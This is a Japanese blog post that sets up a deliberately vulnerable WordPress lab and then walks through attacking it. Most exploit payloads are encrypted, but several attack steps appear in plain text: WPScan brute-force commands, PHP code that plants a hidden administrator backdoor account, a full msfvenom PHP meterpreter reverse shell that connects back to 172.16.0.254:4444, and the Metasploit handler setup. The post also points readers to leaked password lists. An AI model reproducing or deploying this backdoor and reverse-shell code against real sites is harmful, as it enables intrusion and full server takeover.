---
layout: post
title:  "WordPress Build & Crack"
date:   2018-10-29
permalink: /security/:title
categories: Security
tags: WordPress
excerpt: WordPressの構築とクラッキング
mathjax: false
---

* content
{:toc}

# 環境構築

## php
```
# phpのインストール
yum install -y php php-mysql

# phpが動作することを確認
php -r 'print "hello world\n"'
```

## Apache httpd
```
# Apache httpdの起動
systemctl enable httpd
systemctl start httpd

# テストページの設置
cat > /var/www/html/index.php << END
<?php
phpinfo();
?>
END
```

### (option)firewalld/selinux
検証環境を手早く構築するためにセキュリティ機構を停止しています。
本来は適切なアクセス許可を付与するべきです。
```
# ファイアウォールの停止
systemctl stop firewalld

# SELinuxの停止
setenforce 0
```

テストページにアクセスして動作確認します。

![](/images/wordpress/phpinfo.png)

## MySQL(MariaDB)
WordpressのバックエンドDBのMySQLを用意します。
ここで作成するデータベース名、ユーザー名、パスワードは後で参照するので覚えておいてください。
```
# MariaDBのインストールと起動
yum install -y mariadb mariadb-server
systemctl enable mariadb
systemctl start mariadb

# データベースの初期化スクリプトを作成
cat > /tmp/init.sql << END
set password for root@localhost=password('rootpassword');
insert into user set user="wpadmin", password=password("wpadmin"), host="localhost";
create database wpdb;
grant all on wpdb.* to wpadmin;
flush privileges;
END

# データベースの初期化スクリプトを実行
mysql -u root -D mysql < /tmp/init.sql

# 以下の設定が完了したことを確認
# - rootユーザーのパスワードが変更されていること
# - wpdbデータベースが作成されていること
# - wpdbデータベースの権限を持つwpadminユーザーが作成されていること
echo 'select Db, User from db;'| mysql -u root -D mysql -prootpassword

# wpadminユーザーでログインできることを確認
echo 'show tables;'|mysql -u wpadmin -D wpdb -pwpadmin
```

## wordpress
wordpress公式が古いバージョンのWordPressを配布しています。
利用する脆弱性に応じたWordPressを取得してください。
例としてWordPress4.6.0の設置手順を記載します。
```
# wordpressのダウンロードと設置
wget https://ja.wordpress.org/wordpress-4.6-ja.tar.gz -O /tmp/wordpress-4.6-ja.tar.gz
tar -zxvf /tmp/wordpress-4.6-ja.tar.gz -C /var/www/html/
mv /var/www/html/wordpress/ /var/www/html/4.6.0/

# アクセス権限をapache:apacheに変更
chown -R apache: /var/www/html/4.6.0
```
ブラウザからwordpressのパスにアクセスすると初期設定ウィザードが開きます。
いくつかの項目を埋めてwp-config.php（Wordpressの設定ファイル）を作成します。

![](/images/wordpress/setup-config.png)

MySQLに作成したデータベース名、ユーザー名、パスワードを指定します。
ここで指定するユーザーはサイトの管理者ではありません。

![](/images/wordpress/setupconfig2.png)

wp-config.phpが作成されたらこの画面が表示されます。
まだインストール実行をクリックしないでください。

![](/images/wordpress/setupconfig3.png)

今回は脆弱性のある環境を構築するため、あらかじめWordpressの自動更新を無効化します。
```
# Wordpressの自動アップデートを無効化
echo "define('AUTOMATIC_UPDATER_DISABLED', true);" >> /var/www/html/4.6.0/wp-config.php
```

自動更新を無効化したらインストール実行をクリックします。
ここで指定するユーザーがサイトの管理者になります。
パスワードを忘れないようにメモしてください。

![](/images/wordpress/setupconfig4.png)

サイトの情報を設定してWordPressをインストールをクリックすれば構築は完了です。

![](/images/wordpress/installcomplete.png)

Hello world!にアクセスできることを確認します。

![](/images/wordpress/wpindex.png)

### (option)wp_posts
WordPressのコンテンツはデータベースに格納されています。
mysqlにアクセスすることで投稿内容やユーザーデータを確認できます。
```
# wpdbデータベースにテーブルが増えている事を確認
echo "show tables;" | mysql -u wpadmin -D wpdb -pwpadmin

# 投稿に関する情報を確認
echo "select * from wp_46posts;" | mysql -u wpadmin -D wpdb -pwpadmin

# ユーザー一覧を確認
echo "select * from wp_users;" | mysql -u wpadmin -D wpdb -pwpadmin

# ユーザー権限を確認
echo "select * from wp_usermeta where meta_key Like 'wp_capabilities';" | mysql -u wpadmin -D wpdb -pwpadmin
```

# 攻撃

## コンテンツ改ざんの脆弱性
WordPress4.7.0からREST APIが実装されました。
APIを介してコンテンツの取得、更新、削除が行えます。
REST APIが有効ならば以下のURLでコンテンツの一覧を取得できます。
```
http://localhost/4.7.0/index.php/wp-json/wp/v2/posts/
```

WordPress4.7.0のREST APIには認証バイパスの脆弱性があります。
例えば以下のpythonコードはWordPress4.7.0のHello World!ページを書き換えます。

悪用を防ぐためaes256で暗号化してあります。パスワードは弊社名の略称です。
```
U2FsdGVkX19wksWBReZsgKq5X6nV2sbk904L/VszoUCFHPCwBxsDc1tHklTmVzLBPJjr2781u90SgiY9o5i4+wUYH0L/vE2B2MM1TVjauPij5NF+IJMzGru9kMhq2lzNJeL1TqKjM23/EzHK5piFXiAVCjy7lSsv3LhhQcmK4dPVf5cSrj7DTrMEBv3zUKCmjScEFOgtvHEefofMs4ZUJq/bi+htXZguLVy7ZBdDajKyY3EgBetvyHVjG+IIPhgh7YyCG6dYR8zsSc8UiMC+WsDZ5IluZNp1YsxPF4uv2PLDY+bVPupVP6tccdF3WeaoLVyG8yM+mLmT3nzXLxXQMa7CW20+8QQW8LNBlo00++uJa5MRkHZkwODanacT/E7o
```

Fiddler等のローカルプロキシを使ってREST APIをコールする事も出来ます。
送信するPOSTリクエストは以下の通りです。

悪用を防ぐためaes256で暗号化してあります。パスワードは弊社名の略称です。
```
U2FsdGVkX19T2S9GM16Rn3P+PPFPGvIL+jolJnOxec9PRAVK/AdeJUax1l5d9k9knMAjAEEz5EXGx8hKSe6//dPLgatOTZ6wJsvu7jgIIiosS3NMZYftSMirq1unxlvg9SeSJGLiOeXCsv5khvfGjs5TszP+l4EJZrLOWytoahMjHZf46AxAhur/bjPDynNYLGQfVqNlDa+peF0L4r4YglusySAbY0FBnQR3t9nzNiXZ8dfK8rJJcWszvpoy7fPJ/IdGmtUaC04jNSJzYVD1Sw==
```

![](/images/wordpress/fiddler02.png)

WordPressのユーザーアカウントを使わずにコンテンツを書き換えることが出来ました。
ただし、WordPressのセキュリティ機能であるksesの働きにより、XSSに繋がる`<script>`タグ等を書き込むことは出来ません。
ksesを突破するには特権アカウントを奪う必要があります。

![](/images/wordpress/fiddler03.png)

## ユーザーアカウントの奪取

ユーザーアカウントを奪取するシンプルな方法の一つはブルートフォースです。
WPScanを使ってユーザーアカウントを列挙し、パスワードリストを組み合わせてアタックします。
```
# ユーザーアカウントを列挙する
wpscan -u http://target-server/wordpress-dir/ --enum users

# ユーザーアカウントを指定してパスワードリストの中からヒットする物を全探索する
wpscan -u http://target-server/wordpress-dir/ --username targetuser --wordlist passwordlist
```

ブルートフォースを行う際は、質の良いパスワードリストの入手が課題になります。
[OpenWallが提供しているpassword.gz](https://download.openwall.net/pub/wordlists/passwords/password.gz)は手軽に利用できます。
また、pastebinやtorネットワーク上に、実システムから漏えいしたパスワードリストがアップロードされる事もあります。

対象のサーバの防御が甘く、ブルートフォースに十分な時間を掛けられるなら、この手法が通用することもあるでしょう。

## XSSの脆弱性

ブルートフォースに時間を掛けられないなら、あなたはスナイパーのように相手の隙を探すことも出来ます。
WordPress CoreもしくはPluginに含まれるXSSの脆弱性を利用すれば、ksesの影響を受けずに特権アカウントを得ることが出来るかもしれません。
例えば、対象のWordPressに[Activity Log Plugin](https://ja.wordpress.org/plugins/aryo-activity-log/)がインストールされていれば、次の攻撃を試す価値があります。

悪用を防ぐためaes256で暗号化してあります。パスワードは弊社名の略称です。
```
U2FsdGVkX1+coBOcBKCzqamqzRdhiX1JjgOV4C8E4yI9RaEtIXVyOLV057UnGTF79q30sZ85xxYwjpjy8C9SAgFmyNfoUZ0EaPHVUbj0P2z1vVOL/LFwLJ+I0sKOprBT0CLoopq448a3AJM2OocUas3tOdGanxZvYKwk5Q1cD4uKTlKp2vz70uNViueyTisAhKradz0YaeEO/7sVw8u9N/xqXUrZLe0CJl8bBLnKGM2vo4t4+eBHHMejBLc7f5ASrKUYazUzYpNVs/aJRronilUT13n4an0eI/kiZd3rgBSY9MkNklpYqnl9pkS4Zyj8
```

![](/images/wordpress/fiddler04.png)

攻撃に成功すればActivity Logにアクセスログが追記されます。
Webサイトのオーナーがログを確認したタイミングで格納型XSSが起動します。

![](/images/wordpress/log_activity01.png)

## 有用なXSSペイロード

おめでとう！あなたはターゲットに不正なスクリプトを注入し、アラートを表示させることに成功しました！
でも、ちょっと待ってください。あなたは脅威に対する理解を深め、実際にお客様のサーバを監視する必要があったはずです。現実の攻撃はこんなチュートリアルでは済みません。
ここからは、どのようなスクリプトを用意すればターゲットに致命的なバックドアを作成できるのかを学びます。

### phpコード注入
まずは次のワンライナーを注入し、Activity Logを表示して格納型XSSを起動しましょう。

悪用を防ぐためaes256で暗号化してあります。パスワードは弊社名の略称です。
```
U2FsdGVkX18/WB2d2+ipDPcSVsIZ62Px7VNRwC0LmdXjCO0CeknoJqnPW/Dnzn9YcikfpcrEWVbdzBKbyo5Cn3OfIkYgpJvdvPXLq1Doww8OYjA7H7EdFKFRRl5LhMGHdx3Xn9QM0Sc0uvkCn27E+pdxoUJRniX9uQd9frMynipZsOWOU6pxtqAZEd3kI3/LDOUjJeubosY8/05nct4bfVzGf/YZO5qf6v6MAOHEeCIqqQ7vZi2FyLrTte8eMkkpjm2soYrcUWRafcX/xyYZsu4YsyPX3DjBB+wzUKzo+0eho4b+Ou3h2KPwpeZNdSaAk8HcGj4ncoQWgXDasCekndmG2Vc5SSwsZkW0Pn47JjsSheY0EJL6P6KCyMuv4Bf1fGKu5YQUMo5hpWBKQZaEGDClw3I68jUBupjVPlXJl6oYjhq3IOl70+QtA1qbsBTOzz1vRtSL6bylrbcxsPjlQA==
```
↓ 参考のために整形
```
U2FsdGVkX18zqMrMd7J7zH5zoUm4c2y88uH778CNivZkXzZVnPAQG3Bg/flqLYWNMVlhw68SG/EaA6tAXjG9Zx0cAhtXVoRK32bEkeTZ9gGcvZKm/Q0tJXMQNa6C9/Kkd/w6RJLQ/1vidYMsLOkg54HogdF9y3hPiWufYaASvcCOT/lFkuOpLZwRSC0Kx+binmwEfSifjSzGJhgd2U7JMWtbLV7iKrul5UiXbDfpOKKr0QsZplOrlViIvfqIGrSAcB02LY85Z6G4EKB+aMJlPRMrdDojyfPP452BAQVzUORK42KPFJoXgyuHMKHC1E2VNpiNJjIScOB+SkwUbyWejUsV3fCXvKZZzZX11AHPEGZ2pEI86zTMEcsnAyYKbHpjMVu5xQU2uGUWnvXBaTP1Ke01016L02EXIvAeUlt+VTCbcG1LdwvVoQJbn61g0YoXrhBIOQVjA+ijwB5S8gVPRQevIJwPb3H/eqUfy8/BobK5VdwLe5uwuxrGUG7mFmPg6CqGsyZw6Tn+i37OZ6jMGoSzimizSHfeExVxoBFH0FM=
```

その後ページを更新するとphpinfoが表示されます。

![](/images/wordpress/xss01.png)

ダッシュボードから 外観>テーマの編集>テーマヘッダー を確認すると、XSSで注入されたphpコードが確認できます。
このコードが実行された事により、ターゲットにphpinfoが出力されるようになりました。

![](/images/wordpress/xss02.png)

このXSSペイロードは[XSS in WordPress: a tutorial](https://www.dxw.com/2017/07/wordpress-xss-tutorial/)を参考にしました。

### データベース操作

phpinfoは貴重な情報ですが、もう少し工夫してみましょう。
WordPressデータベースを操作し、バックドアとして利用する特権ユーザーを作成します。
次のワンライナーを注入して、XSSを起動してください。
```
U2FsdGVkX1+lrU5qd6vLjVmy8kjGOn4THRV7StgjfP34q0Vfh6ibLsS3G8FpfL60kpkre4Nz8oj/EBny4kaQ6+6AKbv+ZJkyifomgjU/cvnsVpLHcRvF6f7YK2YyWQoWbhHc9iQuij0P6m+kOnkaJ4kXHS1XV8Je4VYeKZsMRZDnlO2XEKgV31Ial9tpPwhuQXLyt+VRh68AV3i9/b6uD4PuLloLvzcNZNgUm02AyDHvvB1kvhI2hvj/yecVHEGgzc22HgoRVknDrCa5kvSGZZcsk7XbvrKb9d4KNfcauey1nFa6YLhrOGocsTqZZ7iR4/cknhpYgOwWeh1MQVXuOxQ9sy3dVluxj965z0/w93191UtQX279D/Dn6xDVgBoncT0MFjb20ZU92K/3YSb4e1Ije6zNgoDXGDCotrCSPvWyLGPEiCBS1s1NfoWpqxXa5S2ud3YZ2GJluLsfQnLIyj21kSZwZwIJ6c/RvqBXK7EgUebfUYPK/y+oDpIz2VGNwGus5QJsfQ1Du8S3poMLAEIFBE6hSsrkwauW//b4JiL0TjzL+vLHHfYLJ7rLPiZL6+ZGvgh057GrD2hFoL4GHNFlNfuGONfSMkYy7D3tNI8ntUrFj6aO3L90lN2Klh1F33JlwcTLSKTQ+i9FrLUOr8YuWddJfLzyC/XiDKc1fO/dNDn0rkZB2uTphS0oW3MS0bnfWtkITvjTFxIhyaY/iyyYXl9Vx54bbSGY/r2BxfmG4+IXSbdSoOXByhxhQrfXiVwTB0n59BkJYzWP3M+2ivqu2g7Vg69aFN40vUhisJNAwDAnoRgGU+96Iz2kx/6pLQibqfHIy4qUIS2nq8nv5g==
```
↓ 参考のためにphpコード部を整形
```
<?php
$wpdb->insert(
  'wp_users',
  array(
    'ID' => 999,
    'user_login' => 'b@ckd00r',
    'user_pass' => md5('b@ckd00r')
    ),
  array(
    '%d',
    '%s',
    '%s'
    )
  );
$wpdb->insert(
	'wp_usermeta',
	array(
		'umeta_id' => 9999,
		'user_id' => 999,
    'meta_key' => 'wp_capabilities',
    'meta_value' => 'a:1:{s:13:\"administrator\";b:1;}'
	),
	array(
    '%d',
    '%d',
    '%s',
    '%s'
	)
);
?>
```

WordPressのダッシュボードに今作ったユーザーでログインできることを確認しましょう。

![](/images/wordpress/xss03.png)

ダッシュボードに辿り着いたなら、あなたはこのサイトを支配下に収めたということです。
この先何をするのかはあなたの想像力にかかっています。

![](/images/wordpress/xss04.png)

### リバースシェル

リバースシェルを設置すればターゲットをOSレベルで支配することが出来ます。
Kali Linuxを起動してphpのリバースシェルを生成しましょう。
次の例ではC2サーバが172.16.0.254:4444でコネクトバックを待ち受けることを想定しています。
複雑なコードなのでXSSを介して書き込むことは困難です。
WordPressのダッシュボードから404.phpなどを直接編集してコードを書き込みましょう。

**リバースシェルの生成**
```
msfvenom -p php/meterpreter/reverse_tcp LHOST=172.16.0.254 LPORT=4444 -f raw

↓ 出力結果

/*<?php /**/ error_reporting(0); $ip = '172.16.0.254'; $port = 4444; if (($f = 'stream_socket_client') && is_callable($f)) { $s = $f("tcp://{$ip}:{$port}"); $s_type = 'stream'; } if (!$s && ($f = 'fsockopen') && is_callable($f)) { $s = $f($ip, $port); $s_type = 'stream'; } if (!$s && ($f = 'socket_create') && is_callable($f)) { $s = $f(AF_INET, SOCK_STREAM, SOL_TCP); $res = @socket_connect($s, $ip, $port); if (!$res) { die(); } $s_type = 'socket'; } if (!$s_type) { die('no socket funcs'); } if (!$s) { die('no socket'); } switch ($s_type) { case 'stream': $len = fread($s, 4); break; case 'socket': $len = socket_read($s, 4); break; } if (!$len) { die(); } $a = unpack("Nlen", $len); $len = $a['len']; $b = ''; while (strlen($b) < $len) { switch ($s_type) { case 'stream': $b .= fread($s, $len-strlen($b)); break; case 'socket': $b .= socket_read($s, $len-strlen($b)); break; } } $GLOBALS['msgsock'] = $s; $GLOBALS['msgsock_type'] = $s_type; if (extension_loaded('suhosin') && ini_get('suhosin.executor.disable_eval')) { $suhosin_bypass=create_function('', $b); $suhosin_bypass(); } else { eval($b); } die();
```

![](/images/wordpress/reverse01.png)

**C2サーバの起動**

```
msfconsole
msf > use exploit/multi/handler
msf exploit(handler) > set payload php/meterpreter/reverse_tcp
msf exploit(handler) > set LHOST 172.16.0.254
msf exploit(handler) > set LPORT 4444
msf exploit(handler) > exploit
```

![](/images/wordpress/reverse02.png)

**リバースシェルの起動**

```
http://target-server/wordpress-dir/cracked.php
```

![](/images/wordpress/reverse03.png)
